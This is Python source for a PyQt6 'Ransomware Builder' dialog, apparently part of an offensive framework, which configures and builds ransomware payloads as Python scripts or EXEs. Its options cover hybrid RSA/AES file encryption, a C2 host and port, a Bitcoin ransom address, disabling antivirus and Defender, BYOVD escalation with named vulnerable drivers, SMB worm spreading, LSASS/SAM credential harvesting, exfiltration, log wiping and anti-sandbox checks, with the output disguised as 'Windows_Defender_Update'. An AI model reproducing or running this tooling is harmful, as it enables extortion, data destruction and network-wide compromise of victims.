#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from PyQt6.QtWidgets import (
    QDialog,
    QVBoxLayout,
    QHBoxLayout,
    QLabel,
    QLineEdit,
    QPushButton,
    QTextEdit,
    QGroupBox,
    QFormLayout,
    QMessageBox,
    QWidget,
    QTabWidget,
    QCheckBox,
    QSpinBox,
    QComboBox,
    QFileDialog,
    QApplication,
    QProgressBar,
    QSplitter,
    QGridLayout,
    QScrollArea,
    QFrame,
    QListWidget,
    QListWidgetItem,
)
from PyQt6.QtCore import Qt, QThread, pyqtSignal, QTimer
from PyQt6.QtGui import QFont, QColor, QTextCursor, QIcon, QFontDatabase

import os
import sys
import subprocess
import threading
import platform as _platform
from pathlib import Path
from datetime import datetime

# ═══════════════════════════════════════════════════════════════
# RSA KEYPAIR WORKER
# ═══════════════════════════════════════════════════════════════


class RSAKeygenWorker(QThread):
    """Generate RSA keypair di background thread"""

    output = pyqtSignal(str)
    finished = pyqtSignal(bool, str, str)

    def __init__(self, key_size=4096):
        super().__init__()
        self.key_size = key_size

    def run(self):
        try:
            self.output.emit(f"[*] Generating RSA-{self.key_size} keypair...")
            self.output.emit("[*] This may take 5-30 seconds...")

            from Crypto.PublicKey import RSA

            key = RSA.generate(self.key_size)
            private_pem = key.export_key().decode()
            public_pem = key.publickey().export_key().decode()

            self.output.emit(f"[+] RSA-{self.key_size} keypair generated")
            self.output.emit(f"[+] Private key: {len(private_pem):,} chars")
            self.output.emit(f"[+] Public key: {len(public_pem):,} chars")

            self.finished.emit(True, private_pem, public_pem)
        except Exception as e:
            self.output.emit(f"[!] Keygen error: {e}")
            self.finished.emit(False, "", str(e))


# ═══════════════════════════════════════════════════════════════
# RANSOMWARE BUILD WORKER
# ═══════════════════════════════════════════════════════════════


class RansomwareBuildWorker(QThread):
    """Worker thread untuk build ransomware"""

    output = pyqtSignal(str)
    finished = pyqtSignal(bool, str, str, dict)
    progress = pyqtSignal(int)

    def __init__(self, options, output_path):
        super().__init__()
        self.options = options
        self.output_path = output_path
        self._stop = False

    def stop(self):
        self._stop = True

    def run(self):
        try:
            from modules.payload.ransomware_builder import RansomwareBuilder

            self.output.emit("[*] Building ransomware payload...")
            self.progress.emit(5)

            builder = RansomwareBuilder()

            # ═══ HYBRID: Use provided RSA keys ═══
            use_hybrid = self.options.get("USE_HYBRID", True)
            rsa_priv = self.options.get("RSA_PRIVATE_KEY_PEM", "")
            rsa_pub = self.options.get("RSA_PUBLIC_KEY_PEM", "")

            if use_hybrid:
                if not rsa_priv or not rsa_pub:
                    self.output.emit("[*] No RSA keypair provided, generating new...")
                    self.progress.emit(10)
                    rsa_priv, rsa_pub = builder.generate_rsa_keypair(
                        self.options.get("RSA_KEY_SIZE", 4096)
                    )
                    self.output.emit("[+] RSA keypair generated")

            self.progress.emit(20)
            self.output.emit("[*] Generating payload script...")

            # ═══════════════════════════════════════════════════════
            # FEATURE MATRIX LOG — Tampilkan fitur per-OS di console
            # ═══════════════════════════════════════════════════════
            target_os = self.options.get("TARGET_OS", "all").lower()
            include_windows = target_os in ("all", "windows")
            include_linux = target_os in ("all", "linux")
            include_macos = target_os in ("all", "macos")

            av_bypass = self.options.get("AV_BYPASS", True)
            byovd = self.options.get("BYOVD_ENABLED", True)
            smb = self.options.get("SMB_SPREAD", True)
            priv_esc = self.options.get("PRIVILEGE_ESCALATION", True)
            wallpaper = self.options.get("WALLPAPER", True)
            anti_forensic = self.options.get("ANTI_FORENSIC", True)
            gui = self.options.get("GUI_MODE", True)
            self_delete = self.options.get("SELF_DELETE", True)
            post_exploit = self.options.get("POST_EXPLOIT_ENABLED", True)

            self.output.emit("")
            self.output.emit("=" * 60)
            self.output.emit(f"  FEATURE MATRIX — TARGET_OS={target_os.upper()}")
            self.output.emit("=" * 60)

            # ═══ Windows Features ═══
            if include_windows:
                self.output.emit("[+] Windows Features:")
                self.output.emit(
                    f"    [{'ON ' if (av_bypass and priv_esc) else 'OFF'}] "
                    f"UAC Bypass (cmstp/fodhelper/computerdefaults)"
                )
                self.output.emit(f"    [{'ON ' if av_bypass else 'OFF'}] AMSI Bypass")
                self.output.emit(f"    [{'ON ' if av_bypass else 'OFF'}] ETW Bypass")
                self.output.emit(
                    f"    [{'ON ' if av_bypass else 'OFF'}] Defender Disable"
                )
                self.output.emit(f"    [{'ON ' if av_bypass else 'OFF'}] AV/EDR Killer")
                self.output.emit(f"    [{'ON ' if byovd else 'OFF'}] BYOVD Escalation")
                self.output.emit(f"    [{'ON ' if smb else 'OFF'}] SMB Worm")
                self.output.emit(
                    f"    [{'ON ' if post_exploit else 'OFF'}] "
                    f"LSASS/SAM/DPAPI Harvest"
                )
            else:
                self.output.emit("[x] Windows Features: DISABLED (target not Windows)")

            # ═══ Linux Features ═══
            if include_linux:
                self.output.emit("[+] Linux Features:")
                self.output.emit(
                    f"    [{'ON ' if wallpaper else 'OFF'}] "
                    f"Multi-DE Wallpaper (GNOME/KDE/XFCE/Cinnamon/MATE)"
                )
                self.output.emit(
                    f"    [{'ON ' if priv_esc else 'OFF'}] "
                    f"Linux Privesc (sudo/SUID/passwd)"
                )
                self.output.emit(
                    f"    [{'ON ' if anti_forensic else 'OFF'}] "
                    f"Wipe /var/log/* + ~/.bash_history"
                )
                self.output.emit(
                    f"    [{'ON ' if anti_forensic else 'OFF'}] "
                    f"Delete ~/.cache + Trash"
                )
            else:
                self.output.emit("[x] Linux Features: DISABLED (target not Linux)")

            # ═══ macOS Features ═══
            if include_macos:
                self.output.emit("[+] macOS Features:")
                self.output.emit(
                    f"    [{'ON ' if wallpaper else 'OFF'}] osascript Wallpaper"
                )
                self.output.emit(
                    f"    [{'ON ' if priv_esc else 'OFF'}] "
                    f"macOS Privesc (admin prompt)"
                )
                self.output.emit(
                    f"    [{'ON ' if anti_forensic else 'OFF'}] "
                    f"Wipe /var/log/system.log"
                )
            else:
                self.output.emit("[x] macOS Features: DISABLED (target not macOS)")

            # ═══ Cross-Platform Features ═══
            self.output.emit("[+] Cross-Platform Features:")
            self.output.emit(f"    [ON ] Hybrid Encryption (RSA + AES)")
            self.output.emit(f"    [{'ON ' if gui else 'OFF'}] Ransom GUI (Tkinter)")
            self.output.emit(f"    [{'ON ' if self_delete else 'OFF'}] Self-Delete")
            self.output.emit(
                f"    [{'ON ' if post_exploit else 'OFF'}] Post-Exploitation Phase"
            )
            self.output.emit(f"    [ON ] Ransom Note (multi-location)")

            self.output.emit("=" * 60)
            self.output.emit("")

            # ═══ Generate payload ═══
            result = builder.generate_payload(
                self.options["LHOST"],
                self.options["LPORT"],
                self.options.get("ENCRYPTION", "hybrid"),
                self.options["EXTENSIONS"],
                self.options["RANSOM_NOTE"],
                self.options["BTC_ADDRESS"],
                self.options["WALLPAPER"],
                self.options.get("COUNTDOWN_SECONDS", 300),
                self.options.get("EXFILTRATE_FILES", True),
                self.options.get("MAX_FILE_SIZE_MB", 10),
                self.options.get("GUI_MODE", True),
                self.options.get("DECRYPT_KEY", ""),
                self.options.get("AV_BYPASS", True),
                self.options.get("PRIVILEGE_ESCALATION", True),
                rsa_public_key_pem=rsa_pub,
                rsa_private_key_pem=rsa_priv,
                use_hybrid=use_hybrid,
                parallel=self.options.get("PARALLEL_ENCRYPTION", True),
                thread_count=self.options.get("THREAD_COUNT", 4),
                target_os=self.options.get("TARGET_OS", "all"),
                lateral_movement=True,
                lolbins=True,
                spread_methods="all",
                target_subnets="192.168.1.0/24,10.0.0.0/24",
                max_spread_hosts=10,
                use_credentials=True,
                anti_vm=self.options.get("ANTI_VM", True),
                anti_debug=self.options.get("ANTI_DEBUG", True),
                anti_forensic=self.options.get("ANTI_FORENSIC", True),
                anti_dump=self.options.get("ANTI_DUMP", True),
                anti_recovery=self.options.get("ANTI_RECOVERY", True),
                anti_timing=self.options.get("ANTI_TIMING", True),
                anti_sandbox_user=self.options.get("ANTI_SANDBOX_USER", True),
                anti_sandbox_disk=self.options.get("ANTI_SANDBOX_DISK", True),
                anti_sandbox_ram=self.options.get("ANTI_SANDBOX_RAM", True),
                anti_sandbox_cpu=self.options.get("ANTI_SANDBOX_CPU", True),
                anti_sandbox_uptime=self.options.get("ANTI_SANDBOX_UPTIME", True),
                anti_network=self.options.get("ANTI_NETWORK", True),
                self_delete=self.options.get("SELF_DELETE", True),
                polymorphic=self.options.get("POLYMORPHIC", True),
                encrypt_header=self.options.get("ENCRYPT_HEADER", True),
                triple_pass=self.options.get("TRIPLE_PASS", True),
                byovd_enabled=self.options.get("BYOVD_ENABLED", True),
                byovd_driver=self.options.get("BYOVD_DRIVER", "gdrv"),
                byovd_auto_kill_av=self.options.get("BYOVD_AUTO_KILL_AV", True),
                byovd_disable_etw=self.options.get("BYOVD_DISABLE_ETW", True),
                byovd_disable_defender=self.options.get("BYOVD_DISABLE_DEFENDER", True),
                smb_spread=self.options.get("SMB_SPREAD", True),
                smb_methods=self.options.get(
                    "SMB_METHODS", "smb,wmi,psexec,admin_share,remote_schtasks,scmr"
                ),
                smb_max_hosts=self.options.get("SMB_MAX_HOSTS", 50),
                smb_scan_subnets=self.options.get("SMB_SCAN_SUBNETS", "auto"),
                smb_timeout=self.options.get("SMB_TIMEOUT", 5),
                smb_credentials=self.options.get("SMB_CREDENTIALS", ""),
                smb_payload_name=self.options.get("SMB_PAYLOAD_NAME", "svchost.exe"),
                smb_persist=self.options.get("SMB_PERSIST", True),
                smb_self_exec=self.options.get("SMB_SELF_EXEC", True),
                change_desktop_icons_flag=self.options.get(
                    "CHANGE_DESKTOP_ICONS", False
                ),
                ransom_icon_url=self.options.get("RANSOM_ICON_URL", ""),
                # ═══ POST-EXPLOIT ═══
                post_exploit_enabled=self.options.get("POST_EXPLOIT_ENABLED", True),
                post_exploit_actions=self.options.get(
                    "POST_EXPLOIT_ACTIONS", "creds,discovery,exfil"
                ),
                post_exploit_max_exfil_mb=self.options.get(
                    "POST_EXPLOIT_MAX_EXFIL_MB", 2000
                ),
                post_exploit_exfil_method=self.options.get(
                    "POST_EXPLOIT_EXFIL_METHOD", "c2"
                ),
                post_exploit_exfil_categories=self.options.get(
                    "POST_EXPLOIT_EXFIL_CATEGORIES", "all"
                ),
            )

            self.progress.emit(40)
            self.output.emit("[+] Payload script generated")

            # Show RSA info
            if use_hybrid:
                self.output.emit(f"[+] Victim ID: {result.get('victim_id', 'N/A')}")
                self.output.emit(
                    f"[+] Key Fingerprint: {result.get('key_fingerprint', 'N/A')}"
                )
                self.output.emit(
                    f"[+] Private key: {len(result.get('rsa_private_key_pem', '')):,} chars"
                )
                self.output.emit(
                    f"[+] Public key: {len(result.get('rsa_public_key_pem', '')):,} chars"
                )

            # Save RSA keys to disk
            if use_hybrid and result.get("rsa_private_key_pem"):
                try:
                    saved_path = builder.save_private_key(
                        result["rsa_private_key_pem"],
                        output_dir=self.output_path,
                        name=f"private_{result.get('victim_id', 'key')}",
                    )
                    self.output.emit(f"[+] Private key saved: {saved_path}")

                    pub_path = saved_path.replace("private_", "public_").replace(
                        ".pem", "_pub.pem"
                    )
                    with open(pub_path, "w") as f:
                        f.write(result["rsa_public_key_pem"])
                    self.output.emit(f"[+] Public key saved: {pub_path}")
                except Exception as e:
                    self.output.emit(f"[!] Failed to save keys: {e}")

            output_format = self.options.get("OUTPUT_FORMAT", "python")
            base_filename = self.options.get("FULL_FILENAME", "payload")
            target_os = self.options.get("TARGET_OS", "all")

            # Strip extension
            clean_base = base_filename
            for old_ext in [".exe", ".py", ".app", ".bin"]:
                if clean_base.lower().endswith(old_ext):
                    clean_base = clean_base[: -len(old_ext)]
                    break

            if output_format == "exe":
                self.output.emit("[*] Building EXE...")
                self.progress.emit(50)

                # Pre-check PyInstaller
                self.output.emit("[*] Checking PyInstaller availability...")
                try:
                    import PyInstaller  # noqa

                    self.output.emit(
                        f"[+] PyInstaller: "
                        f"{getattr(PyInstaller, '__version__', 'unknown')}"
                    )
                except ImportError:
                    self.output.emit("[!] PyInstaller not installed")
                    self.output.emit("[!] Falling back to Python")
                    py_path = os.path.join(self.output_path, clean_base + ".py")
                    with open(py_path, "w", encoding="utf-8") as f:
                        f.write(result["script"])
                    self.finished.emit(True, py_path, "Python (no PyInstaller)", result)
                    return

                try:
                    r = subprocess.run(
                        [sys.executable, "-m", "PyInstaller", "--version"],
                        capture_output=True,
                        text=True,
                        timeout=15,
                    )
                    if r.returncode != 0:
                        self.output.emit(
                            f"[!] PyInstaller not runnable: {r.stderr[:200]}"
                        )
                        py_path = os.path.join(self.output_path, clean_base + ".py")
                        with open(py_path, "w", encoding="utf-8") as f:
                            f.write(result["script"])
                        self.finished.emit(
                            True, py_path, "Python (PyInstaller broken)", result
                        )
                        return
                    self.output.emit(f"[+] PyInstaller OK: {r.stdout.strip()}")
                except Exception as e:
                    self.output.emit(f"[!] PyInstaller check failed: {e}")

                icon_path = self.options.get("ICON_PATH", "")
                icon_file = (
                    icon_path if icon_path and os.path.exists(icon_path) else None
                )

                exe_path, error = builder.build_exe(
                    result["script"],
                    clean_base,
                    icon_file,
                    output_dir=self.output_path,
                    target_os=target_os,
                )

                if exe_path:
                    self.output.emit(f"[+] EXE built: {exe_path}")
                    self.output.emit(f"[+] Size: {os.path.getsize(exe_path):,} bytes")
                    self.progress.emit(100)
                    self.finished.emit(True, exe_path, "EXE", result)
                    return
                else:
                    self.output.emit(f"[!] EXE failed: {error}")
                    self.output.emit("[!] Falling back to Python")
                    py_path = os.path.join(self.output_path, clean_base + ".py")
                    with open(py_path, "w", encoding="utf-8") as f:
                        f.write(result["script"])
                    self.finished.emit(True, py_path, "Python (EXE fallback)", result)
                    return
            else:
                self.output.emit("[*] Saving Python payload...")
                py_path = os.path.join(self.output_path, clean_base + ".py")
                try:
                    with open(py_path, "w", encoding="utf-8") as f:
                        f.write(result["script"])
                    self.output.emit(f"[+] Python payload: {py_path}")
                    self.output.emit(f"[+] Size: {os.path.getsize(py_path):,} bytes")
                    self.progress.emit(100)
                    self.finished.emit(True, py_path, "Python", result)
                    return
                except Exception as e:
                    self.output.emit(f"[!] Failed: {e}")
                    self.finished.emit(False, str(e), "Error", {})
                    return

        except Exception as e:
            self.output.emit(f"[!] Error: {str(e)}")
            import traceback

            self.output.emit(f"[!] {traceback.format_exc()}")
            self.finished.emit(False, str(e), "Error", {})


# ═══════════════════════════════════════════════════════════════
# RANSOMWARE DIALOG
# ═══════════════════════════════════════════════════════════════


class RansomwareDialog(QDialog):
    """Ransomware Builder v7.0 - Full featured"""

    def __init__(self, framework=None, parent=None):
        super().__init__(parent)
        self.framework = framework
        self.setWindowTitle("Ransomware Builder")
        self.setModal(False)
        self.setMinimumSize(1400, 850)

        self.worker = None
        self.keygen_worker = None
        self.output_dir = str(Path.home() / "lazyframework_payloads")
        self.current_victim_id = ""
        self.current_key_fingerprint = ""
        self.last_output_path = ""

        self.rsa_private_pem = ""
        self.rsa_public_pem = ""

        self._build_ui()

    def _build_ui(self):
        layout = QVBoxLayout(self)
        layout.setSpacing(4)
        layout.setContentsMargins(6, 6, 6, 6)

        # ═══════════════ TITLE BAR ═══════════════
        title_widget = QWidget()
        title_widget.setFixedHeight(38)
        title_widget.setStyleSheet("""
            QWidget {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 #1a0000, stop:0.3 #2a0000,
                    stop:0.5 #3a0000, stop:0.7 #2a0000, stop:1 #1a0000);
                border-radius: 4px;
                border: 2px solid #ff0000;
            }
        """)
        title_layout = QHBoxLayout(title_widget)
        title_layout.setContentsMargins(12, 2, 12, 2)

        title = QLabel("RANSOMWARE BUILDER")
        title.setStyleSheet(
            "color: #ff0000; font-size: 13pt; font-weight: bold; border: none;"
        )
        title_layout.addWidget(title)

        title_layout.addStretch()

        self.status_indicator = QLabel("Ready")
        self.status_indicator.setStyleSheet(
            "color: #50fa7b; font-size: 10pt; font-weight: bold; border: none;"
        )
        title_layout.addWidget(self.status_indicator)

        layout.addWidget(title_widget)

        # ═══════════════ MAIN SPLIT ═══════════════
        main_split = QSplitter(Qt.Orientation.Horizontal)
        main_split.setSizes([580, 780])

        left_panel = self._build_config_panel()
        main_split.addWidget(left_panel)

        right_panel = self._build_output_panel()
        main_split.addWidget(right_panel)

        layout.addWidget(main_split, 1)

        # ═══════════════ PROGRESS BAR ═══════════════
        self.progress_bar = QProgressBar()
        self.progress_bar.setRange(0, 100)
        self.progress_bar.setValue(0)
        self.progress_bar.setFixedHeight(20)
        self.progress_bar.setStyleSheet("""
            QProgressBar {
                border: 1px solid #00ff00;
                border-radius: 3px;
                background: #0a0a0a;
                text-align: center;
                color: #00ff00;
                font-family: 'Consolas', monospace;
                font-weight: bold;
                font-size: 9pt;
            }
            QProgressBar::chunk {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 #00ff00, stop:0.5 #44ff44, stop:1 #00ff00);
                border-radius: 2px;
            }
        """)
        layout.addWidget(self.progress_bar)

    # ═══════════════════════════════════════════════════════════════
    # CONFIG PANEL (LEFT)
    # ═══════════════════════════════════════════════════════════════

    def _build_config_panel(self):
        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        scroll.setFrameShape(QFrame.Shape.NoFrame)
        scroll.setStyleSheet("""
            QScrollArea { background: transparent; border: none; }
            QScrollBar:vertical {
                background: #1e1e1e;
                width: 6px;
                border-radius: 3px;
            }
            QScrollBar::handle:vertical {
                background: #444444;
                border-radius: 3px;
                min-height: 20px;
            }
            QScrollBar::handle:vertical:hover { background: #666666; }
            QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical { height: 0; }
        """)

        panel = QWidget()
        layout = QVBoxLayout(panel)
        layout.setSpacing(3)
        layout.setContentsMargins(3, 3, 3, 3)

        # ═══════════════ ENCRYPTION MODE ═══════════════
        mode_group = QGroupBox("🔐 Encryption Mode")
        mode_group.setStyleSheet(self._group_style("#00ff00"))
        mode_layout = QVBoxLayout()
        mode_layout.setSpacing(4)
        mode_layout.setContentsMargins(8, 12, 8, 6)

        self.encryption_combo = QComboBox()
        self.encryption_combo.addItems(
            [
                "hybrid (RSA-4096 + AES-256-GCM)",
                "xchacha20 (symmetric legacy)",
                "aes256 (symmetric legacy)",
                "chacha20 (symmetric legacy)",
                "xor (INSECURE - demo only)",
                "rc4 (INSECURE - demo only)",
            ]
        )
        self.encryption_combo.setCurrentIndex(0)
        self.encryption_combo.setFixedHeight(26)
        self.encryption_combo.setStyleSheet(self._combo_style())
        self.encryption_combo.currentTextChanged.connect(self._on_encryption_changed)
        mode_layout.addWidget(self.encryption_combo)

        rsa_row = QHBoxLayout()
        rsa_row.setSpacing(6)
        rsa_label = QLabel("RSA Key Size:")
        rsa_label.setStyleSheet("color: #cccccc; font-size: 9pt;")
        rsa_row.addWidget(rsa_label)

        self.rsa_size_combo = QComboBox()
        self.rsa_size_combo.addItems(
            ["2048 (fast)", "3072 (balanced)", "4096 (strongest)"]
        )
        self.rsa_size_combo.setCurrentIndex(2)
        self.rsa_size_combo.setFixedHeight(24)
        self.rsa_size_combo.setStyleSheet(self._combo_style())
        rsa_row.addWidget(self.rsa_size_combo, 1)
        mode_layout.addLayout(rsa_row)

        warn_label = QLabel()
        warn_label.setStyleSheet(
            "color: #ffaa00; font-size: 8pt; padding: 4px; "
            "background: rgba(255, 170, 0, 0.1); border-left: 2px solid #ffaa00;"
        )
        warn_label.setWordWrap(True)
        mode_layout.addWidget(warn_label)

        mode_group.setLayout(mode_layout)
        layout.addWidget(mode_group)

        # ═══════════════ RSA KEYPAIR PANEL ═══════════════
        self.rsa_group = QGroupBox("🔑 RSA Keypair Management")
        self.rsa_group.setStyleSheet(self._group_style("#00ffff"))
        rsa_layout = QVBoxLayout()
        rsa_layout.setSpacing(4)
        rsa_layout.setContentsMargins(8, 12, 8, 6)

        self.rsa_status = QLabel("❌ No keypair generated")
        self.rsa_status.setStyleSheet(
            "color: #ff5555; font-size: 9pt; font-weight: bold; "
            "padding: 6px; background: rgba(255, 85, 85, 0.1); border-radius: 3px;"
        )
        rsa_layout.addWidget(self.rsa_status)

        self.rsa_fingerprint = QLabel("")
        self.rsa_fingerprint.setStyleSheet(
            "color: #00ffff; font-size: 8pt; font-family: Consolas; "
            "padding: 4px; background: rgba(0, 255, 255, 0.05); border-radius: 3px;"
        )
        self.rsa_fingerprint.setWordWrap(True)
        self.rsa_fingerprint.setVisible(False)
        rsa_layout.addWidget(self.rsa_fingerprint)

        btn_row1 = QHBoxLayout()
        btn_row1.setSpacing(4)

        self.gen_keypair_btn = QPushButton("🔐 Generate Keypair")
        self.gen_keypair_btn.setFixedHeight(28)
        self.gen_keypair_btn.setStyleSheet(self._action_btn_style("#00aa00", "#00cc00"))
        self.gen_keypair_btn.clicked.connect(self._generate_keypair)
        btn_row1.addWidget(self.gen_keypair_btn)

        self.load_keypair_btn = QPushButton("📁 Load From File")
        self.load_keypair_btn.setFixedHeight(28)
        self.load_keypair_btn.setStyleSheet(
            self._action_btn_style("#1f6feb", "#388bfd")
        )
        self.load_keypair_btn.clicked.connect(self._load_keypair)
        btn_row1.addWidget(self.load_keypair_btn)

        rsa_layout.addLayout(btn_row1)

        btn_row2 = QHBoxLayout()
        btn_row2.setSpacing(4)

        self.save_keypair_btn = QPushButton("💾 Save Keypair")
        self.save_keypair_btn.setFixedHeight(26)
        self.save_keypair_btn.setStyleSheet(
            self._action_btn_style("#6e40c9", "#8957e5")
        )
        self.save_keypair_btn.clicked.connect(self._save_keypair)
        self.save_keypair_btn.setEnabled(False)
        btn_row2.addWidget(self.save_keypair_btn)

        self.view_keys_btn = QPushButton("👁 View Keys")
        self.view_keys_btn.setFixedHeight(26)
        self.view_keys_btn.setStyleSheet(self._action_btn_style("#a06a00", "#cc8800"))
        self.view_keys_btn.clicked.connect(self._view_keypair)
        self.view_keys_btn.setEnabled(False)
        btn_row2.addWidget(self.view_keys_btn)

        self.clear_keypair_btn = QPushButton("🗑 Clear")
        self.clear_keypair_btn.setFixedHeight(26)
        self.clear_keypair_btn.setStyleSheet(
            self._action_btn_style("#a31515", "#c72e2e")
        )
        self.clear_keypair_btn.clicked.connect(self._clear_keypair)
        self.clear_keypair_btn.setEnabled(False)
        btn_row2.addWidget(self.clear_keypair_btn)

        rsa_layout.addLayout(btn_row2)

        self.rsa_group.setLayout(rsa_layout)
        layout.addWidget(self.rsa_group)

        # ═══════════════ CONNECTION ═══════════════
        conn_group = QGroupBox("🌐 C2 Connection")
        conn_group.setStyleSheet(self._group_style("#ffaa00"))
        conn_layout = QFormLayout()
        conn_layout.setSpacing(3)
        conn_layout.setContentsMargins(6, 10, 6, 4)
        conn_layout.setLabelAlignment(Qt.AlignmentFlag.AlignRight)

        self.lhost_input = QLineEdit()
        self.lhost_input.setText("127.0.0.1")
        self.lhost_input.setPlaceholderText("C2 Server IP")
        self.lhost_input.setFixedHeight(22)
        self.lhost_input.setStyleSheet(self._input_style())
        conn_layout.addRow("Host:", self.lhost_input)

        self.lport_input = QLineEdit()
        self.lport_input.setText("4444")
        self.lport_input.setPlaceholderText("Port")
        self.lport_input.setFixedHeight(22)
        self.lport_input.setStyleSheet(self._input_style())
        conn_layout.addRow("Port:", self.lport_input)

        conn_group.setLayout(conn_layout)
        layout.addWidget(conn_group)

        # ═══════════════ PAYLOAD ═══════════════
        payload_group = QGroupBox("💣 Payload Config")
        payload_group.setStyleSheet(self._group_style("#ffaa00"))
        payload_layout = QFormLayout()
        payload_layout.setSpacing(2)
        payload_layout.setContentsMargins(6, 10, 6, 4)
        payload_layout.setLabelAlignment(Qt.AlignmentFlag.AlignRight)

        self.btc_input = QLineEdit()
        self.btc_input.setText("1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa")
        self.btc_input.setFixedHeight(22)
        self.btc_input.setStyleSheet(self._input_style())
        payload_layout.addRow("BTC:", self.btc_input)

        self.extensions_input = QLineEdit()
        self.extensions_input.setText(
            "txt,doc,docx,pdf,jpg,png,xls,xlsx,ppt,pptx,zip,rar,7z,db,sql,py,js,html,css,json,xml,csv,qcow2,iso,vmdk,vdi,avhd,mp3,mp4,sqlite,sqlite3"
        )
        self.extensions_input.setPlaceholderText(
            "txt,doc,docx,pdf,jpg,png,xls,xlsx,ppt,pptx,zip,rar,7z,db,sql,py,js,html,css,json,xml,csv,qcow2,iso,vmdk,vdi,avhd,mp3,mp4,sqlite,sqlite3,..."
        )
        self.extensions_input.setFixedHeight(22)
        self.extensions_input.setToolTip("File extensions to encrypt (comma-separated)")
        self.extensions_input.setStyleSheet(self._input_style())
        payload_layout.addRow("Ext:", self.extensions_input)

        self.thread_spin = QSpinBox()
        self.thread_spin.setRange(1, 32)
        self.thread_spin.setValue(4)
        self.thread_spin.setFixedHeight(22)
        self.thread_spin.setStyleSheet(self._input_style())
        payload_layout.addRow("Threads:", self.thread_spin)

        payload_group.setLayout(payload_layout)
        layout.addWidget(payload_group)

        # ═══════════════ OUTPUT ═══════════════
        format_group = QGroupBox("📦 Output")
        format_group.setStyleSheet(self._group_style("#00ffff"))
        format_layout = QFormLayout()
        format_layout.setSpacing(2)
        format_layout.setContentsMargins(6, 10, 6, 4)
        format_layout.setLabelAlignment(Qt.AlignmentFlag.AlignRight)

        self.format_combo = QComboBox()
        self.format_combo.addItems(["Python (.py)", "EXE"])
        self.format_combo.setFixedHeight(22)
        self.format_combo.setStyleSheet(self._combo_style())
        self.format_combo.currentTextChanged.connect(self._on_format_changed)
        format_layout.addRow("Format:", self.format_combo)

        self.target_os_combo = QComboBox()
        self.target_os_combo.addItems(["all", "windows", "linux", "macos"])
        self.target_os_combo.setFixedHeight(22)
        self.target_os_combo.setStyleSheet(self._combo_style())
        self.target_os_combo.currentTextChanged.connect(self._on_target_os_changed)
        format_layout.addRow("OS:", self.target_os_combo)

        path_layout = QHBoxLayout()
        path_layout.setSpacing(3)
        self.output_path_input = QLineEdit()
        self.output_path_input.setText(self.output_dir)
        self.output_path_input.setFixedHeight(22)
        self.output_path_input.setStyleSheet(self._input_style())
        path_layout.addWidget(self.output_path_input, 1)

        self.browse_btn = QPushButton("...")
        self.browse_btn.setFixedSize(24, 22)
        self.browse_btn.setStyleSheet(self._browse_btn_style())
        self.browse_btn.clicked.connect(self._browse_output_folder)
        path_layout.addWidget(self.browse_btn)
        format_layout.addRow("Path:", path_layout)

        self.file_name_input = QLineEdit()
        self.file_name_input.setText("Windows_Defender_Update")
        self.file_name_input.setFixedHeight(22)
        self.file_name_input.setStyleSheet(self._input_style())
        self.file_name_input.textChanged.connect(self._update_exe_status)
        format_layout.addRow("Name:", self.file_name_input)

        icon_layout = QHBoxLayout()
        icon_layout.setSpacing(3)
        self.icon_path_input = QLineEdit()
        self.icon_path_input.setPlaceholderText("Optional (.ico/.png)")
        self.icon_path_input.setFixedHeight(22)
        self.icon_path_input.setStyleSheet(self._input_style())
        self.icon_path_input.setEnabled(False)
        icon_layout.addWidget(self.icon_path_input, 1)

        self.icon_browse_btn = QPushButton("...")
        self.icon_browse_btn.setFixedSize(24, 22)
        self.icon_browse_btn.setStyleSheet(self._browse_btn_style())
        self.icon_browse_btn.clicked.connect(self._browse_icon)
        self.icon_browse_btn.setEnabled(False)
        icon_layout.addWidget(self.icon_browse_btn)
        format_layout.addRow("Icon:", icon_layout)

        self.format_status = QLabel("Python - runs with python3")
        self.format_status.setStyleSheet(
            "color: #50fa7b; font-size: 8pt; padding: 2px;"
        )
        self.format_status.setWordWrap(True)
        format_layout.addRow("", self.format_status)

        format_group.setLayout(format_layout)
        layout.addWidget(format_group)

        # ═══════════════ AV BYPASS ═══════════════
        av_group = QGroupBox("🛡️ AV/EDR Bypass + Killer")
        av_group.setStyleSheet(self._group_style("#ff0055"))
        av_layout = QVBoxLayout()
        av_layout.setSpacing(3)
        av_layout.setContentsMargins(6, 10, 6, 4)

        self.av_bypass_cb = QCheckBox("Enable AV Bypass + Killer")
        self.av_bypass_cb.setChecked(True)
        self.av_bypass_cb.setStyleSheet(
            "color: #ff0055; font-size: 9pt; font-weight: bold;"
        )
        av_layout.addWidget(self.av_bypass_cb)

        av_group.setLayout(av_layout)
        layout.addWidget(av_group)

        # ═══════════════ BYOVD ═══════════════
        byovd_group = QGroupBox("🔧 BYOVD Escalation")
        byovd_group.setStyleSheet(self._group_style("#ff6600"))
        byovd_layout = QVBoxLayout()
        byovd_layout.setSpacing(3)
        byovd_layout.setContentsMargins(6, 10, 6, 4)

        row1 = QHBoxLayout()
        self.byovd_enabled_cb = QCheckBox("Enable")
        self.byovd_enabled_cb.setChecked(True)
        self.byovd_enabled_cb.setStyleSheet(
            "color: #ffaa00; font-size: 9pt; font-weight: bold;"
        )
        row1.addWidget(self.byovd_enabled_cb)

        row1.addWidget(QLabel("Driver:"))
        self.byovd_driver_combo = QComboBox()
        self.byovd_driver_combo.addItems(
            ["gdrv", "rtcore64", "winio", "dbgv", "cpuz", "aswark", "kprocesshacker"]
        )
        self.byovd_driver_combo.setFixedHeight(22)
        self.byovd_driver_combo.setStyleSheet(self._combo_style())
        self.byovd_driver_combo.setMaximumWidth(120)
        row1.addWidget(self.byovd_driver_combo)
        row1.addStretch()
        byovd_layout.addLayout(row1)

        row2 = QHBoxLayout()
        row2.setSpacing(10)
        self.byovd_kill_av_cb = QCheckBox("Kill AV")
        self.byovd_kill_av_cb.setChecked(True)
        self.byovd_kill_av_cb.setStyleSheet("color: #cccccc; font-size: 8pt;")
        row2.addWidget(self.byovd_kill_av_cb)

        self.byovd_etw_cb = QCheckBox("Disable ETW")
        self.byovd_etw_cb.setChecked(True)
        self.byovd_etw_cb.setStyleSheet("color: #cccccc; font-size: 8pt;")
        row2.addWidget(self.byovd_etw_cb)

        self.byovd_defender_cb = QCheckBox("Disable Defender")
        self.byovd_defender_cb.setChecked(True)
